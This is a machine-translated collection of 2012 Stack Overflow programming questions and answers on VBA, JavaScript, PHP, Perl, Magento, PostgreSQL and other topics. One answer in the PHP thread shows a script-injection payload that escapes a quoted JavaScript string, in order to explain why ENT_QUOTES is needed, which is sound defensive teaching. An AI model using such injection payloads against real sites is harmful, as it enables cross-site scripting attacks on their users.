[![捕获](../Images/d8e8a890b377103202efe60d0251471a.png)](http://www.flickr.com/photos/76579226@N04/7071091771/ "由 ____________BOb 在 Flickr 上捕获")

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T08:07:00.997

假设图表之间的唯一区别是指定的一天中的小时，那么我建议：

*   在输入的参数中选择值为 0 到 23 的新数据集添加到报表中`HOURINPUT`- 类似于：`with cte as (select 0 n union all select n+1 n from cte where n < 23) select n report_hour from cte where n in (@HOURINPUT)`
*   将一个新的 tablix 添加到报表中，其中只有一个详细信息单元格，绑定到您的新数据集。
*   将现有图表之一移动到新表的详细信息单元格中，使其成为子报表，将图表中的所有硬编码时间引用替换为`report_hour`对新数据集值的引用。
*   然后，您可以删除其他 23 个图形。

除了确保仅显示所选时间的图表外，这还应该简化报告的未来维护，因为对图表所需的任何更改都只需输入到一个图表中（而不是全部 24 个）。

# c - pcap_open_dead 模拟完整的 UDP 数据包捕获

> ID：10114739
> 
> 赞同：0
> 
> 时间：2012-04-11T22:14:59.760
> 
> 标签：c, linux, udp, pcap, libpcap

继我[关于](https://stackoverflow.com/questions/10113653/creating-a-pcap-file)pcap 文件创建的问题之后，我现在想模拟保存完整的 UDP 数据包，包括以太网、IP 和 UDP 标头。

我应该使用哪种 DLT_XXX 类型？我相信 pcap_dump()在使用 pcap_open_dead(DLT_RAW, 65535) 时会[跳过以太网标头。](http://seclists.org/tcpdump/2010/q2/22)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-12T02:21:49.617

如果你想模拟一个完整的 UDP-over-IP-over-Ethernet 数据包，你需要`DLT_EN10MB`（名称中的“10MB”是历史的；`DLT_EN10MB`真正的意思是“所有类型的以太网”）。

(`DLT_RAW`用于最低级别标头用于 IP 的数据包；它不会跳过以太网标头，这意味着您不必提供以太网标头，实际上，它要求您*不*提供以太网标头- 如果您*确实*提供了一个，它将被写入文件，这会混淆读取文件的程序，因为它们会期望数据包以 IPv4 或 IPv6 标头开头，而不是以太网标头。）

# excel - Excel 用户表单文本框行为

> ID：10114749
> 
> 赞同：0
> 
> 时间：2012-04-11T22:15:40.170
> 
> 标签：excel, vba, textbox, userform, setfocus

我在用户窗体上有一个文本框。它是表单上唯一的文本框。除了这个文本框之外，还有三个标签和两个按钮。基本上，除了单击其中一个按钮的那一刻之外，我希望在所有情况下都将焦点保留在此文本框上，但随后我希望焦点立即回到文本框。两个按钮都将“TakeFocusOnClick”和“TabStop”设置为 False。我在将焦点设置到文本框时遇到问题，这就是我更改这两个设置的原因。

一旦我更改了这些设置，文本框中的 Enter 键就不再起作用。我为文本框的 _AfterUpdate 和 _KeyPress 编写了事件，但它们不会触发。正如您在代码中看到的那样，我已经注释掉了将焦点设置到此文本框的行。由于它现在是唯一可以聚焦的对象，因此不需要这些线（理论上）。当我允许其他对象获得焦点时，这些线没有任何效果（尽管有这些 SetFocus 线，焦点仍切换到按钮）。

这是代码。这很简单，只是 Enter 键没有触发事件。谁能明白为什么？谢谢。

```
Private Sub btnDone_Click()
    Application.Calculation = xlCalculationAutomatic
    formMath.Hide

    'Clear statistics
    Range("attempts").Value = 0
    Range("correct").Value = 0
    Sheet5.Range("A2:W500").ClearContents

End Sub

Private Sub btnSubmit_Click()
    recordAnswer
    'formMath.txtAnswer.SetFocus
End Sub

Private Sub txtAnswer_AfterUpdate()
    recordAnswer
    'formMath.txtAnswer.SetFocus
End Sub

Private Sub txtAnswer_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    If KeyAscii = 13 Then
        recordAnswer
    End If
End Sub

Private Sub UserForm_Initialize()

    'Initialize manual calculation
    Application.Calculation = xlCalculationManual
    Application.Calculate

    'Initialize statistics
    Range("attempts").Value = 0
    Range("correct").Value = 0
    Sheet5.Range("A2:W500").ClearContents

    'Initialize first problem
    newProblem

End Sub

Sub recordAnswer()

    'Update statistics
    Dim attempts, correct As Integer
    attempts = Range("attempts").Value
    correct = Range("correct").Value

    Range("results").Offset(attempts, 0).Value = attempts + 1
    Range("results").Offset(attempts, 1).Value = lblTopNum.Caption
    Range("results").Offset(attempts, 2).Value = lblBotNum.Caption
    Range("results").Offset(attempts, 3).Value = lblBop.Caption
    Range("results").Offset(attempts, 4).Value = Range("Answer").Value
    Range("results").Offset(attempts, 5).Value = txtAnswer.Text

    If (Range("Answer").Value = txtAnswer.Text) Then
        Range("results").Offset(attempts, 6).Value = 1
    Else
        Range("results").Offset(attempts, 6).Value = 0
    End If

    'Update attempts and success
    Range("attempts").Value = attempts + 1
    Range("correct").Value = correct + 1

    newProblem

End Sub

Sub newProblem()

    Application.Calculate
    formMath.lblTopNum.Caption = Range("TopNum").Value
    formMath.lblBotNum.Caption = Range("BotNum").Value
    formMath.lblBop.Caption = Range("ProbType").Value
    formMath.txtAnswer.Value = ""
    'formMath.txtAnswer.SetFocus

End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T06:39:31.383

我找到了一种方法来实现这一点。在上面的代码中，我取出了 _KeyPress 和 _AfterUpdate 事件并将它们替换为：

```
Private Sub txtAnswer_KeyDown(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
    Select Case KeyCode
        Case 13: recordAnswer
    End Select
End Sub 
```

不知道为什么其他方法不起作用，但确实如此。

也不知道为什么简单地直接设置焦点不起作用。我怀疑焦点正在设置，但随后发生了其他事情，正在改变文本框的焦点。只是一个猜测。

谢谢您的帮助。我很感激。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T23:17:16.217

开始

您可以在设计模式下`TabIndex`将 Textbox 的属性设置为 0，也可以将焦点设置在`UserForm_Initialize()`

```
Private Sub UserForm_Initialize()
    TextBox1.SetFocus
End Sub 
```

同样，在您执行任何操作之后，只需调用`TextBox1.SetFocus`即可恢复到文本框。

```
Option Explicit

Private Sub UserForm_Initialize()
    TextBox1.SetFocus
End Sub

Private Sub CommandButton1_Click()
    MsgBox "Hello from Button 1"
    TextBox1.SetFocus
End Sub

Private Sub CommandButton2_Click()
    MsgBox "Hello from Button 2"
    TextBox1.SetFocus
End Sub 
```

让我知道这是否不是您想要的？

# php - 在用户输入后输出 SESSION - 防止 xss

> ID：10114751
> 
> 赞同：0
> 
> 时间：2012-04-11T22:15:40.863
> 
> 标签：php, xss

我有这段代码来回显刚刚登录的用户的用户名：

```
echo $_SESSION['user']['username']." 
```

如果我将代码更改为：

```
echo htmlspecialchars $_SESSION['user']['username']." 
```

我至少在保护自己免受低级 XSS 的攻击？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-12T04:52:21.400

这取决于您输出用户名的位置。如果它在html标签之间，是的。如果它在 html 属性中，则取决于该属性。请参阅 OWASP XSS 预防备忘单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T08:31:29.313

htmlspecialchars函数默认不编码单引号(')，如果你的用户名在html属性或javascript内部回显，就会出现XSS！

例如：

```
<script>
name='$YOUR_NAME_HERE$';
</script> 
```

我们可以设置用户名为';alert('xss');//这样浏览器就会生成这样的html内容

```
<script>
name='';alert('xss');//';
</script> 
```

我给你的建议是：

```
echo htmlspecialchars($_SESSION['user']['username'], ENT_QUOTES); 
```

# javascript - 使用 Javascript 和构造函数的动态变量名称：使用 EaselJS 将图像动态克隆到多个画布

> ID：10114754
> 
> 赞同：1
> 
> 时间：2012-04-11T22:15:55.653
> 
> 标签：javascript, html, syntax, html5-canvas, easeljs

再会！我在这里寻求有关应用于构造函数的 Javascript 中的动态变量名称的帮助。这比预期的要困难得多。我已经在许多论坛和网页上阅读过这个问题，但我找不到我做错了什么=/

我正在使用一个名为[EaselJS](http://easeljs.com/)的 HTML5+Javascript 库，但我的问题与它无关，而是与 Javascript 语法有关！这是我的问题。我得到了这个代码：

```
stage1 = new Stage(document.getElementById("cnvs1"));
stage2 = new Stage(document.getElementById("cnvs2"));
stage3 = new Stage(document.getElementById("cnvs3")); 
```

在这里，变量*stage*已经分配了一个 Stage 对象，该对象使用 canvas id *cnvs*初始​​化。这一行（在我的其余代码的上下文中）有效！我想用这样的 for 将其简化为一行：

```
for(i = 0; i < 5; i++){
  //Of course this is wrong!
  stage[i] = new Stage(document.getElementById("cnvs[i]"));
} 
```

[此处的此链接](http://www.hiteshagrawal.com/javascript/dynamic-variables-in-javascript)恢复了如何完成此操作：使用*eval*（很多人说不推荐）和使用*window*（推荐）然后如果我这样做（没有`for`进一步简化）：

```
var varname = "stage";
var i = 1;
window[varname + i] = new Stage(document.getElementById("cnvs_terminal1")); 
```

代码仍然有效。但我不知道如何用引号中的画布 ID 完成类似的解决方案。这些代码行失败：

```
var i = 1;
var varname = "stage";
var varname2 = 'cnvs1';
var varname3 = "\"cnvs1\"";
var varname4 = "\"cnvs1" + i + "\"";

window[varname +i] = new Stage(document.getElementById(window[varname2]));
window[varname +i] = new Stage(document.getElementById(window[varname3]));
window[varname +i] = new Stage(document.getElementById(window[varname4])); 
```

在这些尝试中，甚至试图传递我需要的确切值（没有*i*）它对我没有帮助！我正在反斜杠引号，因为我认为它们对于`getElementbyId`=( =( =(

现在我一无所知！=(我确定有办法做到这一点，也许我不知道语法，也许我不知道如何正确地通过引用或按值调用变量，我不知道...请帮助我，我不知道怎么做这个简单的任务！

非常感谢 =)

***编辑：*** 尝试@cHao 的建议我也做不到！为简单起见，我将 for for i 设置为仅一个：

```
for (var i = 1; i <= 1; ++i) {
  //I use only one of the following lines at a time of course, but I'll write here my failing tries all together:
  stage[i] = new Stage(document.getElementById('cnvs'+i));
  stage[i-1] = new Stage(document.getElementById('cnvs'+i));

  //Hardcoding the first variable works!
  stage1 = new Stage(document.getElementById('cnvs'+i));
} 
```

它解决了一半的问题，但是如何处理第一个变量？=/谢谢！！！！

***编辑2：*** 已要求提供更多详细信息！这是一个复制/粘贴示例！只需更新 EaselJS 和图像路径即可！

```
<!DOCTYPE HTML>
<html>
  <head>
    <script src="easeljs-0.4.0-26/lib/easel.js"></script>       

    <script type="text/javascript"> 
      function init() {
        //MY PROBLEM LIES HERE!!
        for (var i = 1; i <= 1; ++i) {
          //This code WORKS
          stage1 = new Stage(document.getElementById('cnvs'+i));
          //This code DOES NOT WORKS
          //stage[i] = new Stage(document.getElementById('cnvs'+i));
          //stage[i-1] = new Stage(document.getElementById('cnvs'+i));
        }
        var images = "images/itzapic.jpg";
        bitmap = new Bitmap(images);
        stage1.addChild(bitmap);
        stage1.update();
        Ticker.addListener(window);
      }

      function tick() {
        stage1.update();
      }
    </script>        
  </head>

  <body onload="init()"> 
    <canvas id="cnvs1" width="140" height="82">
  </body>
</html> 
```

# ****__ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* _ *_* __ *_* _****

 *****编辑 3：已解决！*** 我将发布最终代码以供希望使用 EaselJS 在尽可能多的画布中使用同一对象渲染单个图像的人参考。为此，您需要用于阶段的 bitmap.clone() 方法和数组。感谢@cHao 帮助我；）以下代码将在所有画布中呈现相同的图像！必要时更新；）

```
<!DOCTYPE HTML>
<html>
  <head>
    <script src="easeljs-0.4.0-26/lib/easel.js"></script>       

    <script type="text/javascript"> 
      stage = [];
      function init() {
        for (var i = 1; i <= 6; ++i) {
          stage[i-1] = new Stage(document.getElementById('cnvs'+i));
        }
        var images = "images/itzapic.jpg";
        bitmap = new Bitmap(images);
        stage[0].addChild(bitmap);
        for (var i = 1; i <= 5; ++i) {
          stage[i].addChild(bitmap.clone());
        }
        stage[0].update();
        Ticker.addListener(window);
        }

        function tick() {
        for (var i = 0; i < stage.length; ++i) {
          stage[i].update();
        }
      }
</script>        
</head>

  <body onload="init()"> 
    <canvas id="cnvs1" width="140" height="82"></canvas>
    <canvas id="cnvs2" width="140" height="82"></canvas>
    <canvas id="cnvs3" width="140" height="82"></canvas>
    <canvas id="cnvs4" width="140" height="82"></canvas>
    <canvas id="cnvs5" width="140" height="82"></canvas>
    <canvas id="cnvs6" width="140" height="82"></canvas>
  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:26:05.860

不确定我是否明白评估或预先计算变量名称的意义。好像你可以这样做

```
for (var i = 1; i <= 5; ++i) {
    stage[i] = new Stage(document.getElementById('cnvs' + i));
} 
```

`window["varname"]`除非是全球性的，否则无济于事`varname`，而且……嗯。如果可以的话，你会想要避免使用全局变量。无论哪种方式，您都不需要转义引号 - 您根本不需要名称本身的引号，除非您的 ID 在其中包含引号（无论如何，AFAIK 都是无效的）或者您正在评估（这是本身就是邪恶的）。

如果您希望将阶段放入一个数组中（这似乎是一个更好的目标），您会希望您的第一个阶段是`stage[0]`. 在这种情况下，设置`stage[i-1]`而不是`stage[i]`.

如果您尝试设置`stage1`,`stage2`等...停止。不要那样做。你有一堆物品，你对待它们是一样的……这就是数组的用途。一方面，请注意使用数组元素比使用类似名称的变量容易得多？我什至没有看到这个问题，因为数组已经不是问题了。

至于你的代码......看这个。

```
stage = [];

function init() {
    for (var i = 1; i <= 1; ++i) {
        stage[i-1] = new Stage(document.getElementById('cnvs'+i));
    }
    var images = "images/itzapic.jpg";
    bitmap = new Bitmap(images);
    stage[0].addChild(bitmap);
    stage[0].update();
    Ticker.addListener(window);
}

function tick() {
    for (var i = 0; i < stage.length; ++i) {
        stage[i].update();
    }
} 
```

一旦我们从`stage1` `stage2`破碎切换到使用数组，现在我们可以拥有任意多的阶段。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:33:12.227

我不会使用带有数字后缀的 id 来引用您的画布，而是通过标签名称获取它们：

```
var canvases = document.getElementsByTagName("canvas"); 
```

或者，如果您只想处理页面上的某一组画布元素，请给它们一个类：

```
var canvases = document.getElementsByClassName("cnvs"); 
```

然后，要从您的画布中获取一个阶段数组，请劫持`Array.map()`* 方法：

```
var stages = [].map.call(canvases, function(canvas) {
    return new Stage(canvas);
}); 
```

* * *

*`Array.map()`是 JS5 的新功能，但如果您的浏览器支持`<canvas>`，它支持 JS5。无论如何，这里是一个[实现`Array.map()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/map#Compatibility)的链接，您可以使用它来支持旧版浏览器，以防您必须支持旧版浏览器并且您还没有使用 JS5 shim。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:24:15.053

我想你想要这个：

```
var stagePrefix = 'stage';
var canvasPrefix = 'cnvs';
//adjust loop below based on your naming e.g. do they start at 0 or 1?
for(var i=1;i<5;i++){
  window[stagePrefix + i] = new Stage(document.getElementById(canvasPrefix + i));
} 
```**

# iis - 解析/分析 IIS 日志的工具有哪些 - 最好是免费/开源？

> ID：10114757
> 
> 赞同：0
> 
> 时间：2012-04-11T22:16:21.613
> 
> 标签：iis, logging

注意：这里已经提出了一些类似的问题 - 但它们是从 2009 年开始的。从那时起可能发生了一些变化。

我负责托管在不同服务器上的一堆网站。我现在不做任何日志分析，但我想改变它。第一个问题 - 根据 IIS 日志（即 404、500 响应、长页面处理等）查看网站问题的最佳工具是什么？理想情况下有分组/排序选项？我不想花很多时间在这上面，我只想定期检查网站是否一切正常。

第二个问题（我知道我很可能要求太多） - 但是有没有办法将处理过的日志暴露给网络？所以我可以在没有 RPD 进入服务器的情况下查看上面提到的内容？

理想情况下，我正在寻找一个免费/开源的解决方案，但我也准备好为一个好的软件付费（但不是很多美元）。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:42:14.870

您可以看看我们的日志监控解决方案[EventSentry](http://www.eventsentry.com)，它可以监控 IIS 日志等基于文本的日志。我们为 IIS 设置了标准模板，我们可以通过 Web 访问将日志整合到数据库中，这样您就可以在不使用 RDP 的情况下查看日志。

这是一个非常灵活的解决方案，允许您选择您感兴趣的字段，而忽略您不感兴趣的字段 - 从而节省数据库空间。

您还可以设置实时警报，以便在日志文件中遇到严重错误（如 500 错误）时收到电子邮件。

[http://www.eventsentry.com/features/log-file-monitoring](http://www.eventsentry.com/features/log-file-monitoring)

最后，您还可以插入命令行工具来验证给定网页是否可访问，或者在它发生更改时收到警报：[http](http://www.eventsentry.com/features/application-monitoring) ://www.eventsentry.com/features/application-monitoring 。

我当然有偏见，但我会说我们的解决方案非常实惠。由于它还提供了附加功能，例如服务监控（用于监控您的 IIS 服务）和事件日志监控（IIS 确实将关键消息记录到事件日志中），因此您可以使用单个产品设置全面监控。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T06:22:00.157

我会研究@LuckyLuke 解决方案（或类似的） - 经典的“构建与购买”决定。根据您的帖子，这不会是您的“全职”工作，因此恕我直言，最好将其留给那些从事...

我不知道您指的是什么“旧版”答案，但是如果您想修改，可以使用 Microsoft 自己的[日志解析器](http://www.iis.net/community/default.aspx?tabid=34&g=6&i=1976)，并且根据您想要使用它的程度，您可以使用它（COM dll）在 .Net/ASP.Net 中编写您的“管理网页”并将其托管在您的每台服务器中......

如果您对只想收到警报的错误非常具体，另一种“hacky”方式是提供您自己的自定义错误页面（默认 IIS 错误页面，或配置您的 Asp.Net 应用程序以使用特定错误页）。

# c++ - 遮蔽 3rd 方命名空间是否危险？

> ID：10114761
> 
> 赞同：1
> 
> 时间：2012-04-11T22:16:48.000
> 
> 标签：c++, namespaces

我经常发现自己处于 3rd 方库可以使用一些当前不存在的功能或实用程序的情况。在编写这些配套实用程序时，出现了将它们放入哪个命名空间的问题。

我已经选择了一个约定来在我自己的范围内隐藏第 3 方的名称空间，但我并没有完全说服自己没有潜伏着不必要的影响。

示例实用程序标头：

```
#include <third_party/Thing.hpp>

namespace my_namespace
{
    namespace third_party
    {
        typedef ::third_party::Thing<int,3> Thing3i
    }
} 
```

所以问题是：**这样做有什么重大的负面后果吗？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:22:57.740

我没有特别发现任何问题，但我会提醒您不要使用第 3 方污染您的命名空间，以防出现歧义或臃肿，这个问题有一个很好的答案，即嵌套命名空间是否是一个好主意：[C++ 命名空间建议](https://stackoverflow.com/questions/713698/c-namespaces-advice)、 C++ 中的[嵌套](https://stackoverflow.com/questions/3199139/nested-namespaces-in-c)命名空间和此处C++[中命名空间的用法](https://stackoverflow.com/questions/3210927/usage-of-namespaces-in-c)。

一般来说，它应该是安全的，我会将`using namespace third_party`使用限制为仅 cpp 文件，否则如果您要在标头中声明`using namespace third_party`，那么您的标头中的代码`#include`将意外获取第三方名称空间，除非您真的希望发生这种情况。

# c++ - 文件在哪里打开？

> ID：10114762
> 
> 赞同：1
> 
> 时间：2012-04-11T22:16:57.807
> 
> 标签：c++, windows, locked-files

我有一个为 Windows 平台维护的应用程序套件。我最近向共享库添加了一些代码，以在应用程序完成后删除目录。在一个应用中，删除成功；另一方面，我收到一条消息，告诉我该文件正在被另一个进程使用。

下载 Process Explorer 后，我了解到我已经预料到的情况，即持有该文件夹的进程是试图删除它的进程。

当我用谷歌搜索答案时，我看到的只是，“您需要下载 XYZ 以找出保存文件的进程，然后关闭该进程”，其中“XYZ”是 Unlocker、Process Explorer 等。我知道这个过程那是保存文件，但如果我终止它，它怎么能删除文件夹？

有谁知道如何找到保持文件夹打开的代码？在可用于查找哪些进程正在使用哪些文件的工具中，是否可以使用任何工具来查找进程中文件夹的打开位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T10:52:43.077

没有打开文件的“进程中的位置”的概念。例如，无意打开文件的一个非常常见的原因是句柄泄漏。这意味着文件已打开，因为进程中不再存在文件句柄的位置。

# algorithm - 给定大小为 n^3 的立方体，在表面上找不到较小的立方体

> ID：10114768
> 
> 赞同：-1
> 
> 时间：2012-04-11T22:17:15.357
> 
> 标签：algorithm, cube

准备面试并[解决这些问题](http://www.techinterviews.com/amazon-interview-questions)。

> 8.给定一个大小为n*n*n 的立方体（即由n^3 个较小的立方体组成），求表面上较小立方体的数量。将此扩展到k维。

我不太明白这个问题。一方面，我们将在表面上有 n^2 个立方体。一个立方体有 6 个边，所以答案是 6n^2 吗？这对我来说似乎太简单了。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:24:08.550

如果你有一个 4x4x4 的立方体，那么它将包含 64 个大小为 4 的立方体，这些立方体中有多少在表面上？

我会为 3 和 4 做它，然后想出一个方程，并用 5 进行测试。

基本上，有多少立方体不接触表面是另一种看待它的方式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:24:22.083

一侧有 n^2 1*1*1 立方体，但每侧有 (n-1)^2 2*2*2 立方体，... 3*3*3, ...

# magento - Magento - 自定义模块需要多个设置模型

> ID：10114769
> 
> 赞同：5
> 
> 时间：2012-04-11T22:17:23.440
> 
> 标签：magento

在 Magento 中创建自定义模块时，有时需要在系统中创建自定义属性。通常，我会使用我的设置模型扩展相关模块，或者只是扩展 Mage_Core_Model_Resource_Setup。

如果我的模块需要向特定模型添加属性并需要特定的设置模型，即 eav 或 sales - 那么这里的最佳实践是什么。我正在考虑定义我自己的设置模型：MyCompany_MyModuel_Reseource_Setup（适用于 1.6 +），然后在我的 sql 安装文件中创建所需的设置模型。这是这里最好的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-12T11:51:23.820

在模块文件中使用其他模块设置文件是完全可以接受的（并且是适当的）：

```
$otherSetup = Mage::getResourceModel('catalog/setup','default_setup');
$otherSetup->addAttribute(...); 
```

特别是在安装新属性的情况下，每个模块都会为您处理特定于实体的属性默认值（请参阅`_prepareValues()`方法）。

这当然会在您模块的设置类实例中执行，但没关系。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T23:53:07.830

编辑：我已经重新阅读了你的问题，我不确定我是否完全掩盖了你的问题。尽管如此，这些信息还是适用的，所以我将把它留在这里。但是，我认为您的问题是关于向现有实体添加属性的最佳实践。特别是在这一点上，使用设置资源为事物添加属性是完全可以接受的，EAV 或其他。`Mage_Eav_Model_Entity_Setup::addAttribute()`为此，您可以使用类似的函数，或者`Mage_Core_Model_Resource_Setup::run()`根据需要使用 SQL 查询来修改表。

原答案：

可以在同一个模块中使用多个资源，因此这应该足以满足您的要求。

事实上，这很简单，只需定义两个设置资源，Magento 就会同时运行这两个资源。

在您的 config.xml 中：

```
<config>
    ...
    <global>
        ...
        <resources>
            <!-- Resource 1 -->
            <mymodule_setup>
                <setup>
                    <module>MyCompany_MyModule</module>
                </setup>
                <connection>
                    <use>core_setup</use>
                </connection>
            </mymodule_setup>
            <mymodule_write>
                <connection>
                    <use>core_write</use>
                </connection>
            </mymodule_write>
            <mymodule_read>
                <connection>
                    <use>core_read</use>
                </connection>
            </mymodule_read>

            <!-- Resource 2 -->
            <mymodule2_setup>
                <setup>
                    <module>MyCompany_MyModule</module>
                </setup>
                <connection>
                    <use>core_setup</use>
                </connection>
            </mymodule2_setup>
            <mymodule2_write>
                <connection>
                    <use>core_write</use>
                </connection>
            </mymodule2_write>
            <mymodule2_read>
                <connection>
                    <use>core_read</use>
                </connection>
            </mymodule2_read>
        </resources>
        ...
    </global>
    ...
</config> 
```

然后包括必要的安装/升级文件`app/code/local/MyCompany/MyModule/sql/mymodule_setup`和`app/code/local/MyCompany/MyModule/sql/mymodule2_setup`

您甚至可以通过扩展设置模型将自己的功能添加到安装程序中。您可以通过向以下位置添加类标签来做到这一点：

```
<resources>
    <mymodule2_setup>
        <setup> 
```

像这样：

```
<class>MyCompany_MyModule_Entity_Setup</class> 
```

并在`app/code/local/MyCompany/MyModule/Entity/Setup.php`

看起来像这样：

```
<?php
    class MyCompany_MyModule_Entity_Setup extends Mage_Eav_Model_Entity_Setup
    {
    } 
```

因此，正如您所怀疑的，您将需要扩展 Mage_Core_Model_Resource_Setup 或 Mage_Eav_Model_Entity_Setup (eav)。

# binary - 我将如何在 IEEE 标准中编写此内容？

> ID：10114770
> 
> 赞同：0
> 
> 时间：2012-04-11T22:17:23.377
> 
> 标签：binary, floating-point

我想知道如何在 IEEE754 标准中编写 5/32。有没有做分数部分的捷径？

答案是`0 10000010 00100000000000000000000`。但是必须有一种更简单的方法将 5/32 写入这种格式，而不是先将其转换为二进制。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T23:58:07.680

我发现你可以这样做来更快地获得十进制数字。5（以 10 为底）= 101（二进制）和 32 = 1/(2^5)。所以 5/32 只是 101x2^-5

# php - CakePHP 不理解请求对象

> ID：10114771
> 
> 赞同：0
> 
> 时间：2012-04-11T22:17:25.690
> 
> 标签：php, controller, cakephp-2.0

我想编写一些我认为相当简单的代码：**在字段上接受用户输入，然后使用该值更新记录数组。**由于我对 Request 对象的了解很少，我想我正在跌跌撞撞。我的索引视图中有一个表单

```
<div class="<?php echo $this->request->params['action']; ?>">

<?php
echo $this->Form->create('Invoice', array('action' => 'edit'));
echo $this->Form->input('id', array('type' => 'hidden'));
echo $this->Form->input('purchaseOrderNumber');
echo $this->Form->submit('Update Invoices', array('div' => false, 'name' => 'submit'));
?> 

<table>
    <tr>
        <th>Invoice Number</th>
        <th>Customer Name</th>
        <th>Invoice Date</th>
    </tr>

    <!-- Here is where we loop through our $invoices array, printing out invoice info -->

    <?php foreach ($invoices as $invoice): ?>
        <tr>        
            <td>
                <?php echo $this->Html->link($invoice['Invoice']['invoiceNumber'], array('action' => 'edit', $invoice['Invoice']['id'])); ?>
            </td>
            <td>
                <?php echo $invoice['Invoice']['customerName']; ?>
            </td>        
            <td>
                <?php echo $invoice['Invoice']['invoiceDate']; ?>
            </td>          
        </tr>
        <?php
    endforeach;
    echo $this->Form->end();
    ?>

</table>
</div> 
```

很简单。我想从*purchaseOrderNumber*中获取值并使用它来更新在后续 foreach() 中返回的数据集中的记录。尽管我尽了最大的努力寻找线索，但我还没有发现我是如何做到这一点的。我的猜测是，对于更有经验的开发人员来说，这太明显了，以至于他们发现没有必要写它。

任何帮助，将不胜感激。如果您需要更多解释，请询问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T09:51:27.063

我不确定您对 Request 对象不了解什么，但这是您可以做的。

提交发票表单后，表单数据对您的`edit`方法可用。您可以在*InvoicesController*`$this->data`中使用（只读）或`$this->request->data`（可能会更改）来执行更新查询。

 *您的表单返回的数据`$this->data`具有以下结构：

```
array(
    'submit' => 'Update Invoices',
    'Invoice' => array(
        'id' => '1',
        'purchaseOrderNumber' => '3'
    )
) 
```

显然，您不需要提交值，但您可以使用其他数据来检索正确的发票`id`1**并**使用`purchaseOrderNumber`3**更新**它。

理论上的更新将像这样构建：

```
$this->Invoice->save($this->data['Invoice']); 
```

这与此类似，更逐字，等效：

```
$update = array(
  'Invoice' => array(
    'id' => 1,
    'purchaseOrderNumber' => 3
  )
);

$this->Invoice->save($update); 
```

通过提供`id`其他数据，Cake“知道”使用 UPDATE 而不是执行常规 INSERT。

上面的代码来自内存，可能包含错误，但它应该为您指明正确的方向，希望如此。*

# perl - 让 perl 脚本使用几个辅助脚本中的一个

> ID：10114775
> 
> 赞同：3
> 
> 时间：2012-04-11T22:17:42.580
> 
> 标签：perl, include, perl-module

我有一个要从命令行运行的主程序 mytool.pl。有几个辅助脚本 special1.pl、special2.pl 等，每个都包含几个子例程和一个散列，所有脚本的名称都相同。假设它们被命名为 MySpecialFunction()、AnotherSpecialFunction() 和 %SpecialData。

我希望 mytool 根据命令行选项包含/使用/导入特殊 *.pl 文件之一的内容，只有一个文件。例如，用户将执行以下操作：

```
bash> perl mytool.pl  --specialcase=5 
```

mytools 将使用 special5.pl 中的 MySpecialFunction()，并忽略所有其他 special*.pl 文件。

这可能吗？怎么做？

重要的是要注意选择使用哪个特殊文件是在运行时进行的，因此在 mytool.pl 顶部添加“使用”可能不是正确的做法。

注意我是一名长期的 C 程序员，而不是 perl 专家。我可能会问一些明显的问题。这是一个一次性的项目，将在一个月内化为乌有。在这个简短的项目结束后，mytool.pl 和 special?.pl（也包括 perl 本身）都不会引起人们的兴趣。因此，我们不关心复杂的解决方案或需要学习一些深层魔法的解决方案。快速和肮脏的首选。我猜 Perl 的模块机制对此有点矫枉过正，但不知道替代方案是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:34:56.183

您可以使用哈希或数组将值映射`specialcase`到`.pl`文件并根据[需要要求](http://perldoc.perl.org/functions/require.html)或[执行](http://perldoc.perl.org/functions/do.html)它们。

```
#!/usr/bin/env perl

use strict; use warnings;

my @handlers = qw(one.pl two.pl);

my ($case) = @ARGV;
$case = 0 unless defined $case;

# check that $case is within range

do $handlers[$case];

print special_function(), "\n"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T23:17:55.873

当你`use`是一个模块时，Perl 只是`require`一个块中的`BEGIN`模块（并导入模块导出项）。由于您想更改在运行时加载的脚本，请致电您`require`自己。

```
if ($special_case_1) {
  require 'special1.pl';
  # and go about your business
} 
```

这是关于何时使用vs.的一个[很好的参考](https://stackoverflow.com/a/2181778/77782)。`use``require`

# sql - 如何手动设置 auto_increment 的下一个值？

> ID：10114779
> 
> 赞同：13
> 
> 时间：2012-04-11T22:17:52.763
> 
> 标签：sql, postgresql, auto-increment

我手动在表中添加了一些行，还手动设置了 ID（auto_increment）。现在，当我尝试通过我的应用程序将新行添加到 DB 表中时，到 DB 表我收到错误，即创建的 ID 值已经存在。

如何手动设置下一个 ID 值（例如，在表中我必须设置 ID，那么如何告诉 PostgreSQL，下一个 ID 应该从数字 3 开始计算）？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-04-11T22:19:27.457

[http://www.postgresql.org/docs/current/static/functions-sequence.html](http://www.postgresql.org/docs/current/static/functions-sequence.html)

```
select setval('sequence-name', <new-value>); 
```

您可以从表定义中获取序列名称：

```
id       | integer                | not null default nextval('id_seq'::regclass) 
```

在这种情况下，序列被命名为“id_seq”

